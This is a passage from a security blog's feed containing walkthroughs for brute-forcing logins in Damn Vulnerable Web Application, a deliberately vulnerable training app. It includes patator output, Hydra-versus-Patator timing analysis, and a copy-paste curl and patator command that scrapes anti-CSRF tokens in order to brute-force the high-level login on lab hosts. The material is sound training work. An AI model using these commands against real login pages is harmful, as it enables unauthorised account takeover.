&lt;/span&gt;&lt;span class="line"&gt;20:41:23 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456789:user                   &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:26 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456789:adm                    &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;28&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:30 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456789:guest                  &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;26&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:33 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456789:mysql                  &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:36 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456789:info                   &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;27&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:36 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5285:5016     &lt;span class="p"&gt;|&lt;/span&gt; password:admin                   &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;35&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:51 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456789:administrator          &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:51 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456789:oracle                 &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;32&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:51 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456789:ftp                    &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;33&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:51 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; password:root                    &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;34&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:51 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; password:mysql                   &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;40&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:51 patator    INFO - Hits/Done/Skip/Fail/Size: 36/36/0/0/157788301, Avg: &lt;span class="m"&gt;0&lt;/span&gt; r/s, Time: 0h 1m 46s
&lt;/span&gt;&lt;span class="line"&gt;20:41:51 patator    INFO - To resume execution, pass --resume 7,7,7,7,8
&lt;/span&gt;&lt;span class="line"&gt;patator http_fuzz &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;GET   &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/rockyou.txt     2.13s user 0.22s system 2% cpu 1:48.39 total
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Patator main attack" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-10.png" /&gt;&lt;/p&gt;

&lt;p&gt;See how the numbers in the "num" column are different? That is the thread ordering finishing. You can see on the timestamp, in the first column which increases every three seconds. The successful login is indicated by having a different page size (&lt;code&gt;5285&lt;/code&gt;) and content length amount (&lt;code&gt;5016&lt;/code&gt;).&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Summary"&gt;&lt;/a&gt;
&lt;h2&gt;Summary&lt;/h2&gt;

&lt;a name="Benchmark"&gt;&lt;/a&gt;
&lt;h3&gt;Benchmark&lt;/h3&gt;

&lt;p&gt;Same targets and setup as before with the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;192.168.1.11&lt;/code&gt; - Raspberry Pi v1 "B" // Nginx v1.8.0 // PHP v5.6.14 // MariaDB v10.0.21&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.22&lt;/code&gt; - Raspberry Pi v2 "B" // Apache v2.4.10 // PHP v5.6.13 // MySQL v5.5.44&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.33&lt;/code&gt; - Windows XP SP3 (VM: 1 Core/512 MB) // Apache v2.4.10 (XAMPP v1.8.2) // PHP v5.4.31 // MySQL v5.5.39&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.44&lt;/code&gt; - Windows Server 2012 (VM: 1 Core/2048 MB) // IIS v8.0 // PHP v5.6.0 // MySQL v5.5.45&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;Increasing the thread count here is not going to have a major effect&lt;/strong&gt;. The key here is the wait time being long enough (for the built in &lt;strong&gt;delay for the web app cool down&lt;/strong&gt; and thread count). The rest is down to &lt;strong&gt;"luck" with the ordering of threads finishing&lt;/strong&gt;. As long as there is always a request/thread which is waiting to be processed, due to the three second cool down, there cannot be any performance benefit by increasing the threads. If anything, having a larger amount of threads here will only make it more complicated.&lt;/p&gt;

&lt;p&gt;A possible way to attempt to speed up the attack is to use a "better" wordlist; e.g. targeted towards the target, sorted by popularity, have only base-words in the list (i.e.: &lt;code&gt;password&lt;/code&gt; rather than &lt;code&gt;password1999&lt;/code&gt;), no leading/trailing spaces/tabs and no duplicate entries.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Results:&lt;/strong&gt; (With 15 seconds timeout)&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; &lt;strong&gt;HYDRA&lt;/strong&gt;   &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.11&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.22&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.33&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.44&lt;/strong&gt; &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt; 1 Thread    &lt;/td&gt;
&lt;td&gt; 19 mins 09 secs  &lt;/td&gt;
&lt;td&gt; 20 mins 01 secs  &lt;/td&gt;
&lt;td&gt; 18 mins 26 secs  &lt;/td&gt;
&lt;td&gt; 17 mins 50 secs  &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 2 Threads   &lt;/td&gt;
&lt;td&gt; 19 mins 03 secs  &lt;/td&gt;
&lt;td&gt; 17 mins 40 secs  &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 17 mins 43 secs  &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 4 Threads   &lt;/td&gt;
&lt;td&gt; 19 mins 00 secs  &lt;/td&gt;
&lt;td&gt; 17 mins 43 secs  &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 17 mins 46 secs  &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; &lt;strong&gt;PATATOR&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.11&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.22&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.33&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.44&lt;/strong&gt; &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt; 1 Thread    &lt;/td&gt;
&lt;td&gt; 18 mins 19 secs  &lt;/td&gt;
&lt;td&gt; 17 mins 30 secs  &lt;/td&gt;
&lt;td&gt; 17 mins 44 secs  &lt;/td&gt;
&lt;td&gt; 17 mins 24 secs  &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 2 Threads   &lt;/td&gt;
&lt;td&gt; 18 mins 12 secs  &lt;/td&gt;
&lt;td&gt; 17 mins 35 secs  &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 17 mins 25 secs  &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 4 Threads   &lt;/td&gt;
&lt;td&gt; 18 mins 15 secs  &lt;/td&gt;
&lt;td&gt; 17 mins 39 secs  &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 17 mins 28 secs  &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;


&lt;p&gt;&lt;em&gt;&lt;code&gt;192.168.1.33&lt;/code&gt; is still unable to handle multiple threads, just like in the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low security level&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Why.is.Hydra.slower.than.Patator."&gt;&lt;/a&gt;
&lt;h3&gt;Why is Hydra slower than Patator?&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Hydra makes an additional unwanted GET request.&lt;/p&gt;

&lt;p&gt;So both in the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level&lt;/a&gt; and &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;medium level&lt;/a&gt;, Patator has outperformed Hydra. It is time to try and look into &lt;strong&gt;why&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Looking back at the help screen for Hydra, &lt;code&gt;man hydra&lt;/code&gt;:&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;-w TIME
&lt;/span&gt;&lt;span class="line"&gt;defines the max &lt;span class="nb"&gt;wait time &lt;/span&gt;in seconds &lt;span class="k"&gt;for&lt;/span&gt; responses &lt;span class="o"&gt;(&lt;/span&gt;default: 32&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;That makes sense. Now, let's use a proxy (Burp Suite), and hook in both Hydra and Patator and attack the same target. We will use the same password wordlist, wait times, thread count and total possible combinations to try. Because we are using a proxy, we can monitor; what is being sent and when it happens, then compare the results. The top image is Hydra, the bottom is Patator. The values highlighted in orange show the requests which contain our GET parameters, used to brute forced.&lt;/p&gt;

&lt;p&gt;&lt;img alt="Why is Hydra slower than Patator" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-15.png" /&gt;&lt;/p&gt;

&lt;p&gt;So there are two things which stands out:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Hydra is making double the amount of requests&lt;/strong&gt; compared to Patator.

&lt;ul&gt;
&lt;li&gt;Half the requests are with GET parameters (which is what we would expect to see), and the rest is without any parameters set &lt;em&gt;(undesired?)&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;The request styles are being alternated, one with GET parameters, one without, one with, without...&lt;/li&gt;
&lt;li&gt;So it seems they are being sent out as a "pair" of requests.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The timings of the first two requests (aka the first "pair") &lt;strong&gt;are different from all other sets&lt;/strong&gt;.

&lt;ul&gt;
&lt;li&gt;These two requests are being sent out at the same time as each other.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;All the other requests wait&lt;/strong&gt; for the previous one to timeout.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;This is why Hydra takes much longer&lt;/strong&gt;, having to wait for the extra &lt;em&gt;(unused?)&lt;/em&gt; GET request (without any parameters) to timeout.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;So there are two seconds between each attempt to brute force, however, we will only wait for one second to see if there is a reply back&lt;/strong&gt; (then sit around for the same amount of time "doing nothing, wasting time"). &lt;em&gt;Increasing the thread count is not going to speed this up!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;What does this mean? How could we predict the maximum amount of time needed to-do the brute force attack?&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra

&lt;ul&gt;
&lt;li&gt;(&lt;code&gt;possible combinations amount&lt;/code&gt; + (&lt;code&gt;possible combinations amount&lt;/code&gt; - &lt;code&gt;1 pair sending at the same time&lt;/code&gt; )) = &lt;code&gt;total amount of requests&lt;/code&gt; * &lt;code&gt;timeout value&lt;/code&gt; = &lt;code&gt;total time&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;(&lt;code&gt;5 combinations&lt;/code&gt; + (&lt;code&gt;4 unwanted requests&lt;/code&gt;)) = &lt;code&gt;9 requests&lt;/code&gt; * &lt;code&gt;1 second&lt;/code&gt; = &lt;code&gt;9 seconds to complete&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Patator

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;possible combinations amount&lt;/code&gt; = &lt;code&gt;total amount of requests&lt;/code&gt; * &lt;code&gt;timeout value&lt;/code&gt; = &lt;code&gt;total time&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;5 combinations&lt;/code&gt; = &lt;code&gt;5 requests&lt;/code&gt; * &lt;code&gt;1 second&lt;/code&gt; = &lt;code&gt;5 seconds to complete&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;The reason why &lt;code&gt;time&lt;/code&gt; reported Patator took 6 seconds, there is a little delay between Patator opening up and closing down. Patator has its own inbuilt counter, which displays it took 5 seconds.&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Hydra can be sped up, by creating a drop rule for the undesired GET request. An example of this can be found when we did the &lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;main login page&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note, normally the logic would be for every thread wait 3 seconds (&lt;code&gt;1 thread&lt;/code&gt; * &lt;code&gt;cool down seconds&lt;/code&gt;). However, because Hydra's extra GET &amp;amp; wait, every thread waits 1.5 seconds (&lt;code&gt;1 thread&lt;/code&gt; * &lt;code&gt;cool down seconds&lt;/code&gt;/2). This did trip me up, as I was able to do more threads without having to increase the timeout value.&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Conclusion"&gt;&lt;/a&gt;
&lt;h3&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;This attack is very similar to the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level&lt;/a&gt;, as a result we are able to use the same PoCs (&lt;a href="https://github.com/g0tmi1k/boot2root-scripts/blob/master/dvwa-bruteforce-low-http-get.sh"&gt;bash&lt;/a&gt; / &lt;a href="https://github.com/g0tmi1k/boot2root-scripts/blob/master/dvwa-bruteforce-low-http-get.py"&gt;python&lt;/a&gt;) without any alterations. Adding a cool down time on failed logins is not a deterrent for brute force and is not adequate protection. The wait delay will only increase the time needed to perform the attack, slowing down the attack speed.&lt;/p&gt;</description><pubDate>Wed, 04 Nov 2015 16:19:00 +0000</pubDate></item><item><title>DVWA - Brute Force (High Level) - Anti-CSRF Tokens</title><link>https://blog.g0tmi1k.com/dvwa/bruteforce-high/</link><description>&lt;p&gt;This is the final "how to" guide which brute focuses Damn Vulnerable Web Application (DVWA), this time on the &lt;strong&gt;high security level&lt;/strong&gt;. It is an expansion from the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;"low" level (which is a straightforward HTTP GET form attack)&lt;/a&gt;. The &lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;main login screen&lt;/a&gt; shares similar issues (brute force-able and with anti-CSRF tokens). The only other posting is the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;"medium" security level post (which deals with timing issues)&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img alt="Brute Force DVWA High Level" class="center" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high.png" title="Brute Force DVWA High Level" /&gt;&lt;/p&gt;

&lt;p&gt;For the final time, let's &lt;strong&gt;pretend we do not know any credentials&lt;/strong&gt; for DVWA....&lt;/p&gt;

&lt;p&gt;Let's &lt;strong&gt;play dumb and brute force&lt;/strong&gt; DVWA... &lt;em&gt;once and for all!&lt;/em&gt;&lt;/p&gt;

&lt;!--more--&gt;


&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Quick copy/paste&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;curl -s -c dvwa.cookie &lt;span class="s2"&gt;&amp;quot;192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;'value='&lt;/span&gt; &lt;span class="s1"&gt;'/user_token/ {print $2}'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s2"&gt;&amp;quot;'&amp;quot;&lt;/span&gt; -f2&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;SESSIONID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;grep PHPSESSID dvwa.cookie &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s1"&gt;$'\t'&lt;/span&gt; -f7&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b dvwa.cookie -d &lt;span class="s2"&gt;&amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;patator  http_fuzz  &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;GET  &lt;span class="nv"&gt;follow&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="nv"&gt;accept_cookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;  --max-retries&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=FILE1&amp;amp;password=FILE0&amp;amp;user_token=_CSRF_&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Usernames/top_shortlist.txt  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/rockyou-40.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=high; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;before_urls&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;before_header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=high; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;before_egrep&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_CSRF_:&amp;lt;input type='hidden' name='user_token' value='(\w+)' /&amp;gt;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x quit:fgrep&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Welcome to the password protected area'&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;div id="tocBlock"&gt;
&lt;span class="tocHeading"&gt;Table of Contents&lt;/span&gt;
&lt;ul&gt;
 &lt;li&gt;
 &lt;ul&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Objectives"&gt;Objectives&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Setup"&gt;Setup&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Tools"&gt;Tools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Creating.a.Session.Cookie"&gt;Creating a Session Cookie&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Information.Gathering"&gt;Information Gathering&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Form.HTML.Code"&gt;Form HTML Code&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#CSRF.Token.Checking"&gt;CSRF Token Checking&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Timings"&gt;Timings&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Patator"&gt;Patator&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Patator.Documentation"&gt;Patator Documentation&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#L.strong.Patator.Attack.Command..strong."&gt;&lt;strong&gt;Patator Attack Command&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#L.strong.Burp.Suite..strong."&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Configure.Burp"&gt;Configure Burp&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Macro"&gt;Macro&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Intruder"&gt;Intruder&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Hydra"&gt;Hydra&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Proof.of.Concept.Scripts"&gt;Proof of Concept Scripts&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Bash.Template"&gt;Bash Template&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Python.Template"&gt;Python Template&lt;/a&gt;&lt;/li&gt;
